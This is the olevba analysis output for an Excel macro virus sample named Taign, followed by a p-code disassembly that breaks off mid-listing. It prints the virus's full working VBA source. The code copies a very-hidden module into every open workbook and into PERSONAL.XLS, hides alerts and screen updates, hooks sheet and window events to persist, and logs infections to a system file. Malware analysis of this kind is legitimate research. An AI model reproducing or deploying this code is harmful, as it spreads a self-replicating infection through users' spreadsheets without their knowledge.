olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Taign.xls
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Taign.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Taign.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Taign.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Taign.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSExcel.Taign.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




























































































































































































































Public closed
Sub Auto_Open()
Application.ScreenUpdating = False
Application.DisplayAlerts = False
On Error GoTo Err
If Dir("C:\MSOFFICE", vbDirectory) = "" Then MkDir "C:\MSOFFICE"
If Dir("C:\MSOFFICE\EXCEL", vbDirectory) = "" Then MkDir "C:\MSOFFICE\EXCEL"
If Dir("C:\MSOFFICE\EXCEL\XLSTART", vbDirectory) = "" Then MkDir "C:\MSOFFICE\EXCEL\XLSTART"
If Dir("C:\MSOFFICE\EXCEL\XLSTART\ALT", vbDirectory) = "" Then MkDir "C:\MSOFFICE\EXCEL\XLSTART\ALT"
Application.AltStartupPath = "C:\MSOFFICE\EXCEL\XLSTART\ALT\"
Application.OnSheetActivate = ""
Application.OnWindow = ""
If TypeName(Application.Caller) = "String" Then
For c = 1 To Len(Application.Caller)
If Mid(Application.Caller, c, 1) = "[" Then start = c + 1
If Mid(Application.Caller, c, 1) = "]" Then Length = c - start
Next c
If start = 0 Then
Source = Application.Caller
Else
Source = Mid(Application.Caller, start, Length)
End If
issrcVisible = Workbooks(Source).Windows(1).Visible
activewb = ActiveWorkbook.Name
selectsh = ActiveSheet.Name
PersExist = 0
For wb = 1 To Application.Workbooks.Count
If (Workbooks(wb).Name = "PERSONAL.XLS") Then PersExist = wb
exist = 0
For sh = 1 To Workbooks(wb).Modules.Count
If Workbooks(wb).Modules(sh).Name = " " Then
exist = 1
If Workbooks(wb).Modules(sh).Visible = True And Workbooks(wb).Windows(1).Visible = True And Workbooks(wb).ProtectWindows = False Then Workbooks(wb).Modules(sh).Visible = False
End If
Next sh
If exist = 0 And Workbooks(wb).ProtectWindows = False And Workbooks(wb).ReadOnly = False Then
Workbooks(Source).Windows(1).Visible = True
Workbooks(Source).Modules(" ").Visible = True
iswbSaved = Workbooks(wb).Saved
iswbVisible = Workbooks(wb).Windows(1).Visible
Workbooks(wb).Windows(1).Visible = True
If Workbooks(wb).Modules.Count >= 1 Then
Workbooks(Source).Modules(" ").Copy before:=Workbooks(wb).Modules(1)
ElseIf Workbooks(wb).DialogSheets.Count >= 1 Then
Workbooks(Source).Modules(" ").Copy before:=Workbooks(wb).DialogSheets(1)
Else
Workbooks(Source).Modules(" ").Copy before:=Workbooks(wb).Worksheets(1)
End If
Workbooks(wb).Modules(" ").Visible = xlVeryHidden
Workbooks(wb).Windows(1).Visible = iswbVisible
Workbooks(Source).Modules(" ").Visible = False
Workbooks(Source).Windows(1).Visible = issrcVisible
If iswbSaved = True Then Workbooks(wb).Save
End If
Open "c:\windows\system\info.doc" For Append As #1
Print #1, Time$ & "," & Date$ & "," & Workbooks(Source).Path & "\" & Workbooks(Source).Name & "," & Workbooks(wb).Path & "\" & Workbooks(wb).Name
Close
Next wb
If PersExist <> 0 Then
If Workbooks(PersExist).ProtectWindows = False And Workbooks(PersExist).ReadOnly = False Then
fp = 0
For sh = 1 To Workbooks(PersExist).Modules.Count
If Workbooks(PersExist).Modules(sh).Name = " " Then fp = 1
Next sh
If fp = 0 Then
Workbooks(Source).Windows(1).Visible = True
Workbooks(Source).Modules(" ").Visible = True
iswbVisible = Workbooks(PersExist).Windows(1).Visible
Workbooks(PersExist).Windows(1).Visible = True
If Workbooks(PersExist).Modules.Count >= 1 Then
Workbooks(Source).Modules(" ").Copy before:=Workbooks(PersExist).Modules(1)
ElseIf Workbooks(PersExist).DialogSheets.Count >= 1 Then
Workbooks(Source).Modules(" ").Copy before:=Workbooks(PersExist).DialogSheets(1)
Else
Workbooks(Source).Modules(" ").Copy before:=Workbooks(PersExist).Worksheets(1)
End If
Workbooks(PersExist).Modules(" ").Visible = xlVeryHidden
Workbooks(PersExist).Windows(1).Visible = iswbVisible
Workbooks(Source).Modules(" ").Visible = False
Workbooks(Source).Windows(1).Visible = issrcVisible
Open "c:\windows\system\info.doc" For Append As #1
Print #1, Time$ & "," & Date$ & "," & Workbooks(Source).Path & "\" & Workbooks(Source).Name & "," & Workbooks(PersExist).Path & "\" & Workbooks(PersExist).Name
Close
End If
End If
Else
Workbooks(Source).Windows(1).Visible = True
Workbooks(Source).Modules(" ").Visible = True
Workbooks(Source).Sheets(" ").Copy
Modules.Add
ActiveWorkbook.Modules(" ").Visible = xlVeryHidden
newpers = ActiveWorkbook.Name
Workbooks(newpers).Windows(1).Visible = False
Workbooks(newpers).SaveAs FileName:=Application.AltStartupPath & "\PERSONAL.XLS"
Workbooks(Source).Modules(" ").Visible = False
Workbooks(Source).Windows(1).Visible = issrcVisible
End If
If Not Workbooks("PERSONAL.XLS").Saved Then Workbooks("PERSONAL.XLS").Save
End If
Workbooks(activewb).Activate
Sheets(selectsh).Select
Err:
Auto_New
End Sub
Sub Auto_Close()
On Error GoTo Err
If TypeName(Application.Caller) = "String" Then
For c = 1 To Len(Application.Caller)
If Mid(Application.Caller, c, 1) = "[" Then start = c + 1
If Mid(Application.Caller, c, 1) = "]" Then Length = c - start
Next c
If start = 0 Then
Source = Application.Caller
Else
Source = Mid(Application.Caller, start, Length)
End If
closed = 1
Workbooks(Source).RunAutoMacros (xlAutoOpen)
End If
If Not Workbooks("PERSONAL.XLS").Saved Then Workbooks("PERSONAL.XLS").Save
closed = 0
Err:
End Sub
Sub Auto_New()
Application.ScreenUpdating = False
On Error GoTo Err
fp = 0
For sh = 1 To Workbooks("PERSONAL.XLS").Modules.Count
If Workbooks("PERSONAL.XLS").Modules(sh).Name = " " Then fp = 1
Next sh
If fp = 1 Then
Application.OnSheetActivate = "PERSONAL.XLS!Auto_New"
Application.OnWindow = "PERSONAL.XLS!Auto_New"
ElseIf closed = 0 Then
Application.OnSheetActivate = "Auto_New"
Application.OnWindow = "Auto_New"
End If
For sh = 1 To ActiveWorkbook.Modules.Count
If ActiveWorkbook.Modules(sh).Name = " " Then Sheets(" ").Visible = False
Next sh
Workbooks("PERSONAL.XLS").Windows(1).Visible = False
If Dir("C:\MSOFFICE", vbDirectory) = "" Then MkDir "C:\MSOFFICE"
If Dir("C:\MSOFFICE\EXCEL", vbDirectory) = "" Then MkDir "C:\MSOFFICE\EXCEL"
If Dir("C:\MSOFFICE\EXCEL\XLSTART", vbDirectory) = "" Then MkDir "C:\MSOFFICE\EXCEL\XLSTART"
If Dir("C:\MSOFFICE\EXCEL\XLSTART\ALT", vbDirectory) = "" Then MkDir "C:\MSOFFICE\EXCEL\XLSTART\ALT"
Application.AltStartupPath = "C:\MSOFFICE\EXCEL\XLSTART\ALT\"
Err:
End Sub






































'Well I'd call that a work of art....
'December 1997. Hello Teign School!


















































-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSExcel.Taign.xls
' ===============================================================================
' Module streams:
' _VBA_PROJECT_CUR/VBA/ThisWorkbook - 965 bytes
' _VBA_PROJECT_CUR/VBA/Sheet1 - 957 bytes
' _VBA_PROJECT_CUR/VBA/Sheet2 - 957 bytes
' _VBA_PROJECT_CUR/VBA/Sheet3 - 957 bytes
' _VBA_PROJECT_CUR/VBA/Module1 - 13256 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' Line #33:
' Line #34:
' Line #35:
' Line #36:
' Line #37:
' Line #38:
' Line #39:
' Line #40:
' Line #41:
' Line #42:
' Line #43:
' Line #44:
' Line #45:
' Line #46:
' Line #47:
' Line #48:
' Line #49:
' Line #50:
' Line #51:
' Line #52:
' Line #53:
' Line #54:
' Line #55:
' Line #56:
' Line #57:
' Line #58:
' Line #59:
' Line #60:
' Line #61:
' Line #62:
' Line #63:
' Line #64:
' Line #65:
' Line #66:
' Line #67:
' Line #68:
' Line #69:
' Line #70:
' Line #71:
' Line #72:
' Line #73:
' Line #74:
' Line #75:
' Line #76:
' Line #77:
' Line #78:
' Line #79:
' Line #80:
' Line #81:
' Line #82:
' Line #83:
' Line #84:
' Line #85:
' Line #86:
' Line #87:
' Line #88:
' Line #89:
' Line #90:
' Line #91:
' Line #92:
' Line #93:
' Line #94:
' Line #95:
' Line #96:
' Line #97:
' Line #98:
' Line #99:
' Line #100:
' Line #101:
' Line #102:
' Line #103:
' Line #104:
' Line #105:
' Line #106:
' Line #107:
' Line #108:
' Line #109:
' Line #110:
' Line #111:
' Line #112:
' Line #113:
' Line #114:
' Line #115:
' Line #116:
' Line #117:
' Line #118:
' Line #119:
' Line #120:
' Line #121:
' Line #122:
' Line #123:
' Line #124:
' Line #125:
' Line #126:
' Line #127:
' Line #128:
' Line #129:
' Line #130:
' Line #131:
' Line #132:
' Line #133:
' Line #134:
' Line #135:
' Line #136:
' Line #137:
' Line #138:
' Line #139:
' Line #140:
' Line #141:
' Line #142:
' Line #143:
' Line #144:
' Line #145:
' Line #146:
' Line #147:
' Line #148:
' Line #149:
' Line #150:
' Line #151:
' Line #152:
' Line #153:
' Line #154:
' Line #155:
' Line #156:
' Line #157:
' Line #158:
' Line #159:
' Line #160:
' Line #161:
' Line #162:
' Line #163:
' Line #164:
' Line #165:
' Line #166:
' Line #167:
' Line #168:
' Line #169:
' Line #170:
' Line #171:
' Line #172:
' Line #173:
' Line #174:
' Line #175:
' Line #176:
' Line #177:
' Line #178:
' Line #179:
' Line #180:
' Line #181:
' Line #182:
' Line #183:
' Line #184:
' Line #185:
' Line #186:
' Line #187:
' Line #188:
' Line #189:
' Line #190:
' Line #191:
' Line #192:
' Line #193:
' Line #194:
' Line #195:
' Line #196:
' Line #197:
' Line #198:
' Line #199:
' Line #200:
' Line #201:
' Line #202:
' Line #203:
' Line #204:
' Line #205:
' Line #206:
' Line #207:
' Line #208:
' Line #209:
' Line #210:
' Line #211:
' Line #212:
' Line #213:
' Line #214:
' Line #215:
' Line #216:
' Line #217:
' Line #218:
' Line #219:
' Line #220:
' 	Dim (Public) 
' 	VarDefn closed
' Line #221:
' 	FuncDefn (Sub Auto_Open())
' Line #222:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #223:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #224:
' 	OnError Err 
' Line #225:
' 	LitStr 0x000B "C:\MSOFFICE"
' 	Ld vbDirectory 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000B "C:\MSOFFICE"
' 	ArgsCall MkDir 0x0001 
' 	EndIf 
' Line #226:
' 	LitStr 0x0011 "C:\MSOFFICE\EXCEL"
' 	Ld vbDirectory 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0011 "C:\MSOFFICE\EXCEL"
' 	ArgsCall MkDir 0x0001 
' 	EndIf 
' Line #227:
' 	LitStr 0x0019 "C:\MSOFFICE\EXCEL\XLSTART"
' 	Ld vbDirectory 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0019 "C:\MSOFFICE\EXCEL\XLSTART"
' 	ArgsCall MkDir 0x0001 
' 	EndIf 
' Line #228:
' 	LitStr 0x001D "C:\MSOFFICE\EXCEL\XLSTART\ALT"
' 	Ld vbDirectory 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001D "C:\MSOFFICE\EXCEL\XLSTART\ALT"
' 	ArgsCall MkDir 0x0001 
' 	EndIf 
' Line #229:
' 	LitStr 0x001E "C:\MSOFFICE\EXCEL\XLSTART\ALT\"
' 	Ld Application 
' 	MemSt AltStartupPath 
' Line #230:
' 	LitStr 0x0000 ""
' 	Ld Application 
' 	MemSt OnSheetActivate 
' Line #231:
' 	LitStr 0x0000 ""
' 	Ld Application 
' 	MemSt OnWindow 
' Line #232:
' 	Ld Application 
' 	MemLd Caller 
' 	ArgsLd TypeName 0x0001 
' 	LitStr 0x0006 "String"
' 	Eq 
' 	IfBlock 
' Line #233:
' 	StartForVariable 
' 	Ld c 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd Caller 
' 	FnLen 
' 	For 
' Line #234:
' 	Ld Application 
' 	MemLd Caller 
' 	Ld c 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "["
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld c 
' 	LitDI2 0x0001 
' 	Add 
' 	St start 
' 	EndIf 
' Line #235:
' 	Ld Application 
' 	MemLd Caller 
' 	Ld c 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "]"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld c 
' 	Ld start 
' 	Sub 
' 	St Length 
' 	EndIf 
' Line #236:
' 	StartForVariable 
' 	Ld c 
' 	EndForVariable 
' 	NextVar 
' Line #237:
' 	Ld start 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #238:
' 	Ld Application 
' 	MemLd Caller 
' 	St Source 
' Line #239:
' 	ElseBlock 
' Line #240:
' 	Ld Application 
' 	MemLd Caller 
' 	Ld start 
' 	Ld Length 
' 	ArgsLd Mid$ 0x0003 
' 	St Source 
' Line #241:
' 	EndIfBlock 
' Line #242:
' 	LitDI2 0x0001 
' 	Ld Source 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Windows 0x0001 
' 	MemLd Visible 
' 	St issrcVisible 
' Line #243:
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	St activewb 
' Line #244:
' 	Ld ActiveSheet 
' 	MemLd New 
' 	St selectsh 
' Line #245:
' 	LitDI2 0x0000 
' 	St PersExist 
' Line #246:
' 	StartForVariable 
' 	Ld wb 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd Workbooks 
' 	MemLd Count 
' 	For 
' Line #247:
' 	Ld wb 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "PERSONAL.XLS"
' 	Eq 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	Ld wb 
' 	St PersExist 
' 	EndIf 
' Line #248:
' 	LitDI2 0x0000 
' 	St exist 
' Line #249:
' 	StartForVariable 
' 	Ld sh 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld wb 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd Modules 
' 	MemLd Count 
' 	For 
' Line #250:
' 	Ld sh 
' 	Ld wb 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Modules 0x0001 
' 	MemLd New 
' 	LitStr 0x0001 " "
' 	Eq 
' 	IfBlock 
' Line #251:
' 	LitDI2 0x0001 
' 	St exist 
' Line #252:
' 	Ld sh 
' 	Ld wb 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Modules 0x0001 
' 	MemLd Visible 
' 	LitVarSpecial (True)
' 	Eq 
' 	LitDI2 0x0001 
' 	Ld wb 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Windows 0x0001 
' 	MemLd Visible 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	Ld wb 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd ProtectWindows 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	Ld sh 
' 	Ld wb 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Modules 0x0001 
' 	MemSt Visible 
' 	EndIf 
' Line #253:
' 	EndIfBlock 
' Line #254:
' 	StartForVariable 
' 	Ld sh 
' 	EndForVariable 
' 	NextVar 
' Line #255:
' 	Ld exist 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld wb 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd ProtectWindows 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	Ld wb 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd ReadOnly 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #256:
' 	LitVarSpecial (True)
' 	LitDI2 0x0001 
' 	Ld Source 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Windows 0x0001 
' 	MemSt Visible 
' Line #257:
' 	LitVarSpecial (True)
' 	LitStr 0x0001 " "
' 	Ld Source 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Modules 0x0001 
' 	MemSt Visible 
' Line #258:
' 	Ld wb 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd Saved 
' 	St iswbSaved 
' Line #259:
' 	LitDI2 0x0001 
' 	Ld wb 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Windows 0x0001 
' 	MemLd Visible 
' 	St iswbVisible 
' Line #260:
' 	LitVarSpecial (True)
' 	LitDI2 0x0001 
' 	Ld wb 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Windows 0x0001 
' 	MemSt Visible 
' Line #261:
' 	Ld wb 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd Modules 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Ge 
' 	IfBlock 
' Line #262:
' 	LitDI2 0x0001 
' 	Ld wb 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Modules 0x0001 
' 	ParamNamed before 
' 	LitStr 0x0001 " "
' 	Ld Source 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Modules 0x0001 
' 	ArgsMemCall Copy 0x0001 
' Line #263:
' 	Ld wb 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd DialogSheets 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Ge 
' 	ElseIfBlock 
' Line #264:
' 	LitDI2 0x0001 
' 	Ld wb 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd DialogSheets 0x0001 
' 	ParamNamed before 
' 	LitStr 0x0001 " "
' 	Ld Source 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Modules 0x0001 
' 	ArgsMemCall Copy 0x0001 
' Line #265:
' 	ElseBlock 
' Line #266:
' 	LitDI2 0x0001 
' 	Ld wb 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Worksheets 0x0001 
' 	ParamNamed before 
' 	LitStr 0x0001 " "
' 	Ld Source 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Modules 0x0001 
' 	ArgsMemCall Copy 0x0001 
' Line #267:
' 	EndIfBlock 
' Line #268:
' 	Ld xlVeryHidden 
' 	LitStr 0x0001 " "
' 	Ld wb 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Modules 0x0001 
' 	MemSt Visible 
' Line #269:
' 	Ld iswbVisible 
' 	LitDI2 0x0001 
' 	Ld wb 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Windows 0x0001 
' 	MemSt Visible 
' Line #270:
' 	LitVarSpecial (False)
' 	LitStr 0x0001 " "
' 	Ld Source 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Modules 0x0001 
' 	MemSt Visible 
' Line #271:
' 	Ld issrcVisible 
' 	LitDI2 0x0001 
' 	Ld Source 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Windows 0x0001 
' 	MemSt Visible 
' Line #272:
' 	Ld iswbSaved 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld wb 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #273:
' 	EndIfBlock 
' Line #274:
' 	LitStr 0x001A "c:\windows\system\info.doc"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #275:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Time$ 
' 	LitStr 0x0001 ","
' 	Concat 
' 	Ld Date$ 
' 	Concat 
' 	LitStr 0x0001 ","
' 	Concat 
' 	Ld Source 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd Path 
' 	Concat 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld Source 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd New 
' 	Concat 
' 	LitStr 0x0001 ","
' 	Concat 
' 	Ld wb 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd Path 
' 	Concat 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld wb 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd New 
' 	Concat 
' 	PrintItemNL 
' Line #276:
' 	CloseAll 
' Line #277:
' 	StartForVariable 
' 	Ld wb 
' 	EndForVariable 
' 	NextVar 
' Line #278:
' 	Ld PersExist 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #279:
' 	Ld PersExist 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd ProtectWindows 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld PersExist 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd ReadOnly 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #280:
' 	LitDI2 0x0000 
' 	St fp 
' Line #281:
' 	StartForVariable 
' 	Ld sh 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld PersExist 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd Modules 
' 	MemLd Count 
' 	For 
' Line #282:
' 	Ld sh 
' 	Ld PersExist 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Modules 0x0001 
' 	MemLd New 
' 	LitStr 0x0001 " "
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St fp 
' 	EndIf 
' Line #283:
' 	StartForVariable 
' 	Ld sh 
' 	EndForVariable 
' 	NextVar 
' Line #284:
' 	Ld fp 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #285:
' 	LitVarSpecial (True)
' 	LitDI2 0x0001 
' 	Ld Source 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Windows 0x0001 
' 	MemSt Visible 
' Line #286:
' 	LitVarSpecial (True)
' 	LitStr 0x0001 " "
' 	Ld Source 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Modules 0x0001 
' 	MemSt Visible 
' Line #287:
' 	LitDI2 0x0001 
' 	Ld PersExist 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Windows 0x0001 
' 	MemLd Visible 
' 	St iswbVisible 
' Line #288:
' 	LitVarSpecial (True)
' 	LitDI2 0x0001 
' 	Ld PersExist 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Windows 0x0001 
' 	MemSt Visible 
' Line #289:
' 	Ld PersExist 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd Modules 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Ge 
' 	IfBlock 
' Line #290:
' 	LitDI2 0x0001 
' 	Ld PersExist 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Modules 0x0001 
' 	ParamNamed before 
' 	LitStr 0x0001 " "
' 	Ld Source 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Modules 0x0001 
' 	ArgsMemCall Copy 0x0001 
' Line #291:
' 	Ld PersExist 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd DialogSheets 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Ge 
' 	ElseIfBlock 
' Line #292:
' 	LitDI2 0x0001 
' 	Ld PersExist 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd DialogSheets 0x0001 
' 	ParamNamed before 
' 	LitStr 0x0001 " "
' 	Ld Source 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Modules 0x0001 
' 	ArgsMemCall Copy 0x0001 
' Line #293:
' 	ElseBlock 
' Line #294:
' 	LitDI2 0x0001 
' 	Ld PersExist 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Worksheets 0x0001 
' 	ParamNamed before 
' 	LitStr 0x0001 " "
' 	Ld Source 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Modules 0x0001 
' 	ArgsMemCall Copy 0x0001 
' Line #295:
' 	EndIfBlock 
' Line #296:
' 	Ld xlVeryHidden 
' 	LitStr 0x0001 " "
' 	Ld PersExist 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Modules 0x0001 
' 	MemSt Visible 
' Line #297:
' 	Ld iswbVisible 
' 	LitDI2 0x0001 
' 	Ld PersExist 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Windows 0x0001 
' 	MemSt Visible 
' Line #298:
' 	LitVarSpecial (False)
' 	LitStr 0x0001 " "
' 	Ld Source 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Modules 0x0001 
' 	MemSt Visible 
' Line #299:
' 	Ld issrcVisible 
' 	LitDI2 0x0001 
' 	Ld Source 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Windows 0x0001 
' 	MemSt Visible 
' Line #300:
' 	LitStr 0x001A "c:\windows\system\info.doc"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #301:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Time$ 
' 	LitStr 0x0001 ","
' 	Concat 
' 	Ld Date$ 
' 	Concat 
' 	LitStr 0x0001 ","
' 	Concat 
' 	Ld Source 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd Path 
' 	Concat 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld Source 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd New 
' 	Concat 
' 	LitStr 0x0001 ","
' 	Concat 
' 	Ld PersExist 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd Path 
' 	Concat 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld PersExist 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd New 
' 	Concat 
' 	PrintItemNL 
' Line #302:
' 	CloseAll 
' Line #303:
' 	EndIfBlock 
' Line #304:
' 	EndIfBlock 
' Line #305:
' 	ElseBlock 
' Line #306:
' 	LitVarSpecial (True)
' 	LitDI2 0x0001 
' 	Ld Source 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Windows 0x0001 
' 	MemSt Visible 
' Line #307:
' 	LitVarSpecial (True)
' 	LitStr 0x0001 " "
' 	Ld Source 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Modules 0x0001 
' 	MemSt Visible 
' Line #308:
' 	LitStr 0x0001 " "
' 	Ld Source 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Sheets 0x0001 
' 	ArgsMemCall Copy 0x0000 
' Line #309:
' 	Ld Modules 
' 	ArgsMemCall Add 0x0000 
' Line #310:
' 	Ld xlVeryHidden 
' 	LitStr 0x0001 " "
' 	Ld ActiveWorkbook 
' 	ArgsMemLd Modules 0x0001 
' 	MemSt Visible 
' Line #311:
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	St newpers 
' Line #312:
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld newpers 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Windows 0x0001 
' 	MemSt Visible 
' Line #313:
' 	Ld Application 
